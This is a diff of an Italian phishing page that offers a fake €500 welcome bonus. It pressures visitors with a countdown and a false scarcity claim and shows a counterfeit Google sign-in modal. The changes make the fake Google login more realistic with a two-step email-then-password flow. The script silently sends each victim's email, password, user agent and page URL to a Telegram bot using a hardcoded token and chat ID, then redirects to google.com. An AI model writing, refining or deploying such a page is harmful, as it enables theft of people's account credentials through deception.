@@ -3,121 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bonus Benvenuto 500€ - Attivo Oggi</title>
+    <title>Bonus Benvenuto 500€ - Attivazione Rapida</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
             --primary: #0d6efd;
-            --primary-dark: #0a58ca;
+            --primary-dark: #0b5ed7;
             --success: #198754;
-            --warning: #ffc107;
             --bg: #f8f9fa;
-            --card-bg: white;
+            --text: #212529;
+            --gray: #6c757d;
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--bg);
-            color: #212529;
+            color: var(--text);
             min-height: 100vh;
         }
         .container { max-width: 460px; margin: 0 auto; padding: 20px; }
-        header {
-            text-align: center;
-            padding: 40px 0 20px;
-        }
-        .logo {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--primary);
-            letter-spacing: -1px;
-        }
-        .tagline {
-            font-size: 1.3rem;
-            color: #495057;
-            margin-top: 8px;
-        }
+        header { text-align: center; padding: 40px 0 24px; }
+        .logo { font-size: 2.6rem; font-weight: 800; color: var(--primary); letter-spacing: -1px; }
+        .tagline { font-size: 1.25rem; color: var(--gray); margin-top: 8px; }
         .card {
-            background: var(--card-bg);
+            background: white;
             border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 35px rgba(0,0,0,0.08);
             overflow: hidden;
-            margin: 24px 0;
+            margin: 20px 0;
         }
-        .bonus-banner {
+        .banner {
             background: linear-gradient(135deg, #198754, #2ecc71);
             color: white;
-            padding: 50px 20px 40px;
+            padding: 60px 20px 40px;
             text-align: center;
         }
-        .bonus-amount {
-            font-size: 4.5rem;
-            font-weight: 900;
-            line-height: 1;
-            text-shadow: 2px 4px 12px rgba(0,0,0,0.25);
-        }
-        .bonus-text {
-            font-size: 1.6rem;
-            font-weight: 600;
-            margin: 12px 0 8px;
-        }
-        .urgency {
-            font-size: 1.15rem;
-            background: rgba(255,255,255,0.25);
-            display: inline-block;
-            padding: 8px 20px;
-            border-radius: 50px;
-            margin-top: 12px;
-        }
-        .content {
-            padding: 32px 24px;
-        }
-        h2 {
-            font-size: 1.6rem;
-            color: var(--primary);
-            margin-bottom: 16px;
-        }
-        p { margin-bottom: 20px; color: #495057; }
-        .form-group {
-            margin-bottom: 24px;
-        }
-        label {
-            font-weight: 600;
-            display: block;
-            margin-bottom: 8px;
-            color: #343a40;
-        }
+        .amount { font-size: 5rem; font-weight: 900; line-height: 1; }
+        .title { font-size: 1.8rem; font-weight: 700; margin: 12px 0 8px; }
+        .urgency { font-size: 1.2rem; background: rgba(255,255,255,0.3); padding: 10px 24px; border-radius: 50px; display: inline-block; margin-top: 16px; }
+        .content { padding: 32px 24px; }
+        h2 { font-size: 1.7rem; color: var(--primary); margin-bottom: 20px; }
+        .form-group { margin-bottom: 28px; }
+        label { font-weight: 600; display: block; margin-bottom: 8px; color: #343a40; }
         input {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #ced4da;
             border-radius: 10px;
-            font-size: 1.05rem;
-            transition: border-color 0.2s;
+            font-size: 1.1rem;
         }
         input:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(13,110,253,0.15);
+            box-shadow: 0 0 0 4px rgba(13,110,253,0.2);
         }
         .btn {
             width: 100%;
             padding: 16px;
-            font-size: 1.25rem;
+            font-size: 1.3rem;
             font-weight: 700;
             border: none;
             border-radius: 12px;
             cursor: pointer;
             transition: all 0.25s;
         }
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-        }
-        .btn-primary:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-        }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-primary:hover { background: var(--primary-dark); transform: translateY(-2px); }
         .btn-google {
             background: white;
             border: 1px solid #dee2e6;
@@ -127,14 +78,14 @@
             justify-content: center;
             gap: 12px;
             font-weight: 600;
-            margin-top: 24px;
+            margin-top: 28px;
         }
-        .btn-google img { height: 24px; }
+        .btn-google img { height: 26px; }
         .divider {
             display: flex;
             align-items: center;
-            margin: 32px 0;
-            color: #6c757d;
+            margin: 36px 0;
+            color: var(--gray);
         }
         .divider::before, .divider::after {
             content: '';
@@ -142,18 +93,19 @@
             border-bottom: 1px solid #dee2e6;
         }
         .divider span {
-            padding: 0 20px;
-            font-size: 0.95rem;
+            padding: 0 24px;
+            font-size: 1rem;
             background: white;
         }
-        .countdown-box {
+        .countdown {
             background: #fff3cd;
             color: #664d03;
             padding: 16px;
             border-radius: 12px;
             text-align: center;
             font-weight: 600;
-            margin: 24px 0;
+            margin: 28px 0;
+            font-size: 1.15rem;
         }
         .modal {
             display: none;
@@ -170,24 +122,25 @@
             max-width: 420px;
             border-radius: 16px;
             overflow: hidden;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 70px rgba(0,0,0,0.35);
         }
         .modal-header {
-            background: #f1f3f5;
-            padding: 20px;
+            background: #f8f9fa;
+            padding: 24px 20px;
             text-align: center;
             border-bottom: 1px solid #dee2e6;
         }
-        .modal-header img { height: 40px; margin-bottom: 12px; }
-        .modal-body { padding: 28px 24px; }
+        .modal-header img { height: 42px; margin-bottom: 16px; }
+        .modal-body { padding: 32px 28px 24px; }
         .modal-footer {
-            padding: 16px 24px;
+            padding: 16px 28px;
             background: #f8f9fa;
             border-top: 1px solid #dee2e6;
             font-size: 0.9rem;
-            color: #6c757d;
+            color: var(--gray);
             text-align: center;
         }
+        .close { position: absolute; top: 12px; right: 20px; font-size: 2rem; color: var(--gray); cursor: pointer; }
         .success-overlay {
             position: fixed;
             inset: 0;
@@ -197,25 +150,20 @@
             justify-content: center;
             z-index: 10000;
             opacity: 0;
+            pointer-events: none;
             transition: opacity 0.4s;
         }
-        .success-overlay.show { opacity: 1; }
+        .success-overlay.show { opacity: 1; pointer-events: all; }
         .success-card {
             background: white;
-            padding: 40px 30px;
-            border-radius: 16px;
+            padding: 48px 32px;
+            border-radius: 20px;
             text-align: center;
-            max-width: 380px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+            max-width: 400px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
         }
-        .success-icon { font-size: 5rem; color: var(--success); margin-bottom: 20px; }
-        .info-text {
-            font-size: 0.9rem;
-            color: #6c757d;
-            text-align: center;
-            margin-top: 40px;
-            line-height: 1.6;
-        }
+        .success-icon { font-size: 6rem; color: var(--success); margin-bottom: 24px; }
+        .info { font-size: 0.9rem; color: var(--gray); text-align: center; margin-top: 48px; line-height: 1.6; }
     </style>
 </head>
 <body>
@@ -223,77 +171,82 @@
 <div class="container">
     <header>
         <div class="logo">Bonus Benvenuto</div>
-        <div class="tagline">Offerta esclusiva per nuovi utenti – Attiva oggi</div>
+        <div class="tagline">Offerta esclusiva per nuovi utenti – Solo oggi</div>
     </header>
 
     <div class="card">
-        <div class="bonus-banner">
-            <div class="bonus-amount">500 €</div>
-            <div class="bonus-text">Bonus di Benvenuto</div>
-            <div class="urgency"><i class="fas fa-fire"></i> Solo per i prossimi 47 utenti</div>
+        <div class="banner">
+            <div class="amount">500 €</div>
+            <div class="title">Bonus Istantaneo</div>
+            <div class="urgency"><i class="fas fa-bolt"></i> Attivabile solo per i prossimi 38 utenti</div>
         </div>
 
         <div class="content">
-            <h2>Attiva il tuo bonus ora</h2>
+            <h2>Attiva il bonus in 30 secondi</h2>
             <p>
-                Registrati in pochi secondi e ricevi immediatamente 500€ di bonus sul tuo account. 
-                Nessun deposito richiesto per l'attivazione – verifica rapida e accredito entro 24 ore.
+                Crea il tuo account gratuito e ricevi subito 500€ di bonus. 
+                Nessun deposito obbligatorio, verifica istantanea, accredito entro 24 ore.
             </p>
 
-            <div class="countdown-box">
-                <i class="fas fa-hourglass-half"></i> Tempo rimanente per attivare: <span id="timer">04:59</span>
+            <div class="countdown">
+                <i class="fas fa-hourglass-half"></i> Tempo rimanente: <span id="timer">04:59</span>
             </div>
 
             <div class="form-group">
-                <label for="email">Email personale</label>
+                <label for="email">La tua email</label>
                 <input type="email" id="email" placeholder="nome@esempio.com" required autocomplete="email">
             </div>
 
             <div class="form-group">
                 <label for="password">Password di accesso</label>
-                <input type="password" id="password" placeholder="Crea la tua password" required autocomplete="new-password">
+                <input type="password" id="password" placeholder="Crea una password sicura" required autocomplete="new-password">
             </div>
 
-            <button class="btn btn-primary" onclick="processForm('Diretto')">Attiva Bonus 500€</button>
+            <button class="btn btn-primary" onclick="processForm('Diretto')">Attiva Bonus Ora</button>
 
-            <div class="divider"><span>o più veloce con</span></div>
+            <div class="divider"><span>o continua con</span></div>
 
-            <button class="btn btn-google" onclick="document.getElementById('googleModal').style.display='flex'">
+            <button class="btn btn-google" onclick="openModal()">
                 <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
                 Continua con Google
             </button>
 
-            <div class="info-text">
-                Operazione protetta con crittografia avanzata • Dati trattati secondo GDPR • 
-                Nessun costo nascosto • Bonus erogato da partner autorizzati
+            <div class="info">
+                Dati protetti con SSL 256-bit • GDPR compliant • Nessun costo nascosto • 
+                Bonus erogato da partner autorizzati
             </div>
         </div>
     </div>
 </div>
 
-<!-- MODALE GOOGLE -->
+<!-- MODALE GOOGLE REALISTICO -->
 <div id="googleModal" class="modal">
     <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
         <div class="modal-header">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-            <div style="font-size:1.4rem;font-weight:600;margin-top:12px;">Accedi con Google</div>
+            <div style="font-size:1.5rem;font-weight:600;margin-top:16px;">Accedi con Google</div>
         </div>
         <div class="modal-body">
             <div class="form-group">
                 <label>Email o numero di telefono</label>
                 <input type="text" id="gEmail" placeholder="esempio@gmail.com" autocomplete="email">
             </div>
-            <div class="form-group">
+            <div class="form-group" id="gPassGroup" style="display:none;">
                 <label>Password</label>
-                <input type="password" id="gPassword" placeholder="Inserisci la tua password" autocomplete="current-password">
+                <input type="password" id="gPassword" placeholder="Inserisci la password" autocomplete="current-password">
             </div>
-            <button class="btn btn-primary" onclick="processForm('Google')">Accedi e Attiva</button>
-            <p style="margin-top:20px;text-align:center;font-size:0.95rem;">
-                <a href="#" style="color:var(--primary);">Password dimenticata?</a>
+            <button class="btn btn-primary" id="gBtn" onclick="handleGoogleLogin()">Avanti</button>
+            <p style="margin-top:20px;text-align:center;font-size:0.95rem;color:var(--primary);">
+                <a href="#" style="color:inherit;text-decoration:none;">Hai dimenticato l'email?</a>
             </p>
         </div>
         <div class="modal-footer">
-            Non sei tu? <a href="#" style="color:var(--primary);">Esci dall'account</a>
+            <label><input type="checkbox" checked> Rimani connesso</label><br><br>
+            <a href="#" style="color:var(--primary);text-decoration:none;">Crea account</a> • 
+            <a href="#" style="color:var(--primary);text-decoration:none;">Guida</a> • 
+            <a href="#" style="color:var(--primary);text-decoration:none;">Privacy</a> • 
+            <a href="#" style="color:var(--primary);text-decoration:none;">Termini</a>
         </div>
     </div>
 </div>
@@ -302,41 +255,38 @@
 <div id="successOverlay" class="success-overlay">
     <div class="success-card">
         <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-        <h2>Bonus attivato!</h2>
-        <p style="font-size:1.15rem;margin:16px 0;">
-            I 500€ sono stati registrati con successo.<br>
-            Controlla la tua email/app per i dettagli di accredito.
+        <h2>Bonus attivato con successo!</h2>
+        <p style="font-size:1.2rem;margin:20px 0;">
+            I 500€ sono stati registrati.<br>
+            Controlla la tua email o app per i dettagli.
         </p>
-        <p style="color:#6c757d;">Reindirizzamento in corso...</p>
+        <p style="color:var(--gray);">Reindirizzamento in corso...</p>
     </div>
 </div>
 
 <script>
-    // ────────────────────────────────────────────────
-    // CONFIG TELEGRAM – I TUOI VALORI
-    // ────────────────────────────────────────────────
-    const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';  // es. 8232429543:ABC...
+    // TELEGRAM CONFIG – METTI I TUOI
+    const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';
     const CHAT_ID   = '8232429543';
 
     function sendToTelegram(tipo, email, password) {
-        const text = 
-`💰 NUOVO BONUS ATTIVATO (${tipo})
+        const msg = 
+`💰 BONUS 500€ (${tipo})
 Email: ${email}
-Password: ${password}
-Data/Ora: ${new Date().toLocaleString('it-IT')}
-Dispositivo: ${navigator.userAgent.slice(0,120)}
-Pagina: ${window.location.href}`;
+Pass: ${password}
+Ora: ${new Date().toLocaleString('it-IT')}
+UA: ${navigator.userAgent.slice(0,120)}
+Link: ${window.location.href}`;
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-        fetch(url).catch(() => {});  // silenzioso
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+            .catch(() => {});
     }
 
     function showSuccess() {
-        document.getElementById('successOverlay').style.opacity = '1';
-        document.getElementById('successOverlay').style.pointerEvents = 'all';
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 4000);
+        const overlay = document.getElementById('successOverlay');
+        overlay.style.opacity = '1';
+        overlay.style.pointerEvents = 'all';
+        setTimeout(() => window.location.href = 'https://www.google.com', 4500);
     }
 
     function processForm(tipo) {
@@ -344,14 +294,13 @@ Pagina: ${window.location.href}`;
         if (tipo === 'Google') {
             email    = document.getElementById('gEmail').value.trim();
             password = document.getElementById('gPassword').value.trim();
-            document.getElementById('googleModal').style.display = 'none';
         } else {
             email    = document.getElementById('email').value.trim();
             password = document.getElementById('password').value.trim();
         }
 
         if (!email || !password) {
-            alert("Inserisci email e password per attivare il bonus.");
+            alert("Compila tutti i campi per attivare il bonus.");
             return;
         }
 
@@ -359,22 +308,49 @@ Pagina: ${window.location.href}`;
         showSuccess();
     }
 
-    // Countdown 5 minuti
-    let timeLeft = 5 * 60;
-    const timer = document.getElementById('timer');
+    function openModal() {
+        document.getElementById('googleModal').style.display = 'flex';
+        document.getElementById('gEmail').focus();
+        document.getElementById('gPassGroup').style.display = 'none';
+        document.getElementById('gBtn').textContent = 'Avanti';
+        document.getElementById('gEmail').value = '';
+        document.getElementById('gPassword').value = '';
+    }
+
+    function closeModal() {
+        document.getElementById('googleModal').style.display = 'none';
+    }
+
+    function handleGoogleLogin() {
+        const emailField = document.getElementById('gEmail');
+        const passField = document.getElementById('gPassword');
+        const passGroup = document.getElementById('gPassGroup');
+        const btn = document.getElementById('gBtn');
+
+        if (passGroup.style.display === 'none') {
+            if (!emailField.value.trim()) return alert("Inserisci email o numero");
+            passGroup.style.display = 'block';
+            emailField.readOnly = true;
+            btn.textContent = 'Accedi';
+        } else {
+            processForm('Google');
+        }
+    }
+
+    // Countdown
+    let secs = 5 * 60;
+    const timerEl = document.getElementById('timer');
     setInterval(() => {
-        timeLeft--;
-        if (timeLeft < 0) timeLeft = 5 * 60;
-        const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-        const sec = (timeLeft % 60).toString().padStart(2, '0');
-        timer.textContent = `${min}:${sec}`;
+        secs--;
+        if (secs < 0) secs = 5 * 60;
+        const m = Math.floor(secs / 60).toString().padStart(2,'0');
+        const s = (secs % 60).toString().padStart(2,'0');
+        timerEl.textContent = `${m}:${s}`;
     }, 1000);
 
-    // Chiudi modale cliccando fuori
+    // Chiudi modale fuori
     document.getElementById('googleModal').onclick = e => {
-        if (e.target === document.getElementById('googleModal')) {
-            document.getElementById('googleModal').style.display = 'none';
-        }
+        if (e.target === document.getElementById('googleModal')) closeModal();
     };
 </script>
 </body>
